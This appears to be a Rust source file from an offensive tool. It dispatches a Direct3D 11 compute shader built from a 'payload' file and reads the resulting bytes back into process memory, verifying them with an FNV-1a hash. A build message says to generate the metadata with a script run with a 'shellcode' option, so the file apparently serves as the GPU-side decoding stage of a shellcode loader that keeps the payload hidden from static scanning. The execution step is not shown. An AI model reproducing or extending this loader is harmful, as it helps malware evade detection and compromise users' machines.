use windows::Win32::Foundation::HMODULE;
use windows::Win32::Graphics::Direct3D11::{
    ID3D11Device,
    ID3D11DeviceContext,
    D3D11_CREATE_DEVICE_DEBUG,
    D3D11_CREATE_DEVICE_FLAG,
    D3D11CreateDevice,
    D3D11_SDK_VERSION,
    D3D11_BUFFER_DESC,
    D3D11_USAGE_DEFAULT,
    D3D11_BIND_UNORDERED_ACCESS,
    D3D11_RESOURCE_MISC_BUFFER_STRUCTURED,
    D3D11_UNORDERED_ACCESS_VIEW_DESC,
    D3D11_UAV_DIMENSION_BUFFER,
    D3D11_UNORDERED_ACCESS_VIEW_DESC_0,
    D3D11_BUFFER_UAV,
    D3D11_USAGE_STAGING,
    D3D11_CPU_ACCESS_READ,
    D3D11_MAPPED_SUBRESOURCE,
    D3D11_MAP_READ
};
use windows::Win32::Graphics::Direct3D::{D3D_DRIVER_TYPE_HARDWARE, D3D_FEATURE_LEVEL_11_0};
use windows::Win32::Graphics::Dxgi::Common::DXGI_FORMAT_UNKNOWN;

/// Bytecode from `fxc /T cs_5_0 /E CSMain /Fo resources/payload.cso resources/payload.hlsl`.
pub const BYTECODE: &[u8] = include_bytes!("../resources/payload.cso");

include!(concat!(env!("OUT_DIR"), "/meta.rs"));

/// Only used for diagnostics.
pub const META_FILE: &str = "resources/payload.meta.json";

#[derive(Clone, Copy, Debug)]
pub struct PayloadMeta {
    pub word_count: u32,
    pub plain_len: u32,
    pub group_size: u32,
    /// Reference hash of the original payload, when the sidecar provides one.
    pub fnv1a32: Option<u32>,
}

impl PayloadMeta {
    pub fn load() -> Self {
        assert!(
            !META_JSON.is_empty(),
            "{} was missing when this binary was built; generate it with \
             `python main.py <payload> --meta -n shellcode` and rebuild",
            META_FILE
        );

        let meta = Self {
            word_count: json_uint(META_JSON, "word_count"),
            plain_len: json_uint(META_JSON, "plain_len"),
            group_size: json_uint(META_JSON, "group_size"),
            fnv1a32: json_hex(META_JSON, "fnv1a32"),
        };
        assert!(
            (1..=1024).contains(&meta.group_size),
            "group_size {} is not a valid SM 5.0 workgroup size",
            meta.group_size
        );
        assert!(
            meta.word_count > 0 && meta.word_count * 4 >= meta.plain_len,
            "inconsistent metadata: {} words cannot hold {} bytes",
            meta.word_count,
            meta.plain_len
        );
        meta
    }

    /// Bytes the shader writes, i.e. the size of the UAV and of the staging copy.
    fn buffer_bytes(&self) -> u32 {
        self.word_count * 4
    }

    /// One invocation per word, rounded up to whole workgroups.
    pub fn dispatch_groups(&self) -> u32 {
        self.word_count.div_ceil(self.group_size)
    }
}

fn json_uint(json: &str, key: &str) -> u32 {
    let needle = format!("\"{}\":", key);
    let at = json
        .find(&needle)
        .unwrap_or_else(|| panic!("`{}` missing from {}", key, META_FILE))
        + needle.len();
    json[at..]
        .trim_start()
        .chars()
        .take_while(|c| c.is_ascii_digit())
        .collect::<String>()
        .parse()
        .unwrap_or_else(|_| panic!("`{}` is not an integer in {}", key, META_FILE))
}

fn json_hex(json: &str, key: &str) -> Option<u32> {
    let rest = &json[json.find(&format!("\"{}\"", key))?..];
    let at = rest.find("0x")? + 2;
    let digits: String = rest[at..]
        .chars()
        .take_while(|c| c.is_ascii_hexdigit())
        .collect();
    u32::from_str_radix(&digits, 16).ok()
}

pub fn fnv1a32(bytes: &[u8]) -> u32 {
    bytes.iter().fold(0x811C_9DC5u32, |h, b| {
        (h ^ u32::from(*b)).wrapping_mul(0x0100_0193)
    })
}

fn create_device(debug: bool) -> windows::core::Result<(ID3D11Device, ID3D11DeviceContext)> {
    let flags = if debug {
        D3D11_CREATE_DEVICE_DEBUG
    } else {
        D3D11_CREATE_DEVICE_FLAG(0)
    };

    let mut device = None;
    let mut context = None;
    unsafe {
        D3D11CreateDevice(
            None,
            D3D_DRIVER_TYPE_HARDWARE,
            HMODULE::default(),
            flags,
            Some(&[D3D_FEATURE_LEVEL_11_0]),
            D3D11_SDK_VERSION,
            Some(&mut device),
            None,
            Some(&mut context),
        )?;
    }
    Ok((device.unwrap(), context.unwrap()))
}

pub fn run_compute(meta: &PayloadMeta, bytecode: &[u8]) -> windows::core::Result<Vec<u8>> {
    let (device, context) = match create_device(cfg!(debug_assertions)) {
        Ok(pair) => pair,
        Err(err) => {
            eprintln!("D3D11 debug layer unavailable ({err}); continuing without it");
            create_device(false)?
        }
    };

    let byte_width = meta.buffer_bytes();

    unsafe {
        // --- shader ---
        let mut shader = None;
        device.CreateComputeShader(bytecode, None, Some(&mut shader))?;
        let shader = shader.unwrap();

        // --- GPU-side output buffer ---
        let gpu_desc = D3D11_BUFFER_DESC {
            ByteWidth: byte_width,
            Usage: D3D11_USAGE_DEFAULT,
            BindFlags: D3D11_BIND_UNORDERED_ACCESS.0 as u32,
            CPUAccessFlags: 0,
            MiscFlags: D3D11_RESOURCE_MISC_BUFFER_STRUCTURED.0 as u32,
            StructureByteStride: 4,
        };
        let mut gpu_buf = None;
        device.CreateBuffer(&gpu_desc, None, Some(&mut gpu_buf))?;
        let gpu_buf = gpu_buf.unwrap();

        // --- UAV over it ---
        let uav_desc = D3D11_UNORDERED_ACCESS_VIEW_DESC {
            Format: DXGI_FORMAT_UNKNOWN,
            ViewDimension: D3D11_UAV_DIMENSION_BUFFER,
            Anonymous: D3D11_UNORDERED_ACCESS_VIEW_DESC_0 {
                Buffer: D3D11_BUFFER_UAV {
                    FirstElement: 0,
                    NumElements: meta.word_count,
                    Flags: 0,
                },
            },
        };
        let mut uav = None;
        device.CreateUnorderedAccessView(&gpu_buf, Some(&uav_desc), Some(&mut uav))?;

        // --- staging buffer for readback ---
        let staging_desc = D3D11_BUFFER_DESC {
            ByteWidth: byte_width,
            Usage: D3D11_USAGE_STAGING,
            BindFlags: 0,
            CPUAccessFlags: D3D11_CPU_ACCESS_READ.0 as u32,
            MiscFlags: 0,
            StructureByteStride: 0,
        };
        let mut staging = None;
        device.CreateBuffer(&staging_desc, None, Some(&mut staging))?;
        let staging = staging.unwrap();

        // --- dispatch ---
        context.CSSetShader(&shader, None);
        context.CSSetUnorderedAccessViews(0, 1, Some(&uav), None);
        context.Dispatch(meta.dispatch_groups(), 1, 1);

        // unbind so the copy is legal
        context.CSSetUnorderedAccessViews(0, 1, Some(&None), None);

        // --- read back ---
        context.CopyResource(&staging, &gpu_buf);

        let mut mapped = D3D11_MAPPED_SUBRESOURCE::default();
        context.Map(&staging, 0, D3D11_MAP_READ, 0, Some(&mut mapped))?;
        let mut out = vec![0u8; byte_width as usize];
        std::ptr::copy_nonoverlapping(mapped.pData as *const u8, out.as_mut_ptr(), out.len());
        context.Unmap(&staging, 0);

        // The shader zeroes every word past the payload, so the tail is padding.
        out.truncate(meta.plain_len as usize);
        Ok(out)
    }
}